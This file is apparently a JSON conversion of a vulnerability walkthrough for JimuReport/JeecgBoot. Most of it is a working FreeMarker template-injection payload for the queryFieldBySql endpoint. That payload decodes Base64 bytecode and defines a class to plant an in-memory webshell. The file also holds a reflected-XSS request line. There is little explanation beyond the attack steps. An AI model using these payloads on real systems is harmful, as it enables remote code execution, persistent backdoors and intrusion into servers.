@@ -1,0 +1,48 @@
+{
+  "_source_md": "JMReport/2024-08-01-JMReport-Code-Execute-Vuln.md",
+  "version": "JMReport-Code-Execute-Vuln",
+  "title": {
+    "zh": "JimuReport Vuln WalkThrough backup",
+    "en": "JimuReport Vuln WalkThrough backup"
+  },
+  "description": {
+    "zh": "「JMReport」",
+    "en": "「JMReport」"
+  },
+  "steps": [
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "使用内存马工具生成payload，将生成的base64格式的内存马 替换payload 中bytecodeBase64的值\n内存马路径：`http://192.168.18.131:8080/jeecg-boot/jmreport/queryFieldBySql/`",
+        "en": "使用内存马工具生成payload，将生成的base64格式的内存马 替换payload 中bytecodeBase64的值\n内存马路径：`http://192.168.18.131:8080/jeecg-boot/jmreport/queryFieldBySql/`"
+      },
+      "annotation": {
+        "zh": "章节：queryFieldBySql 注入内存马",
+        "en": "Section: queryFieldBySql 注入内存马"
+      },
+      "codeBlocks": [
+        {
+          "language": "text",
+          "code": "{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='这里填入base64的内存马';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}"
+        }
+      ]
+    },
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/\n# JeecgBoot反射型XSS漏洞",
+        "en": "https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/\n# JeecgBoot反射型XSS漏洞"
+      },
+      "annotation": {
+        "zh": "章节：漏洞分析",
+        "en": "Section: 漏洞分析"
+      },
+      "codeBlocks": [
+        {
+          "language": "text",
+          "code": "GET /userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3E HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel MacOS X 10.15; rv:126.0) Gecko/20100101Firefox/126.0"
+        }
+      ]
+    }
+  ]
+}
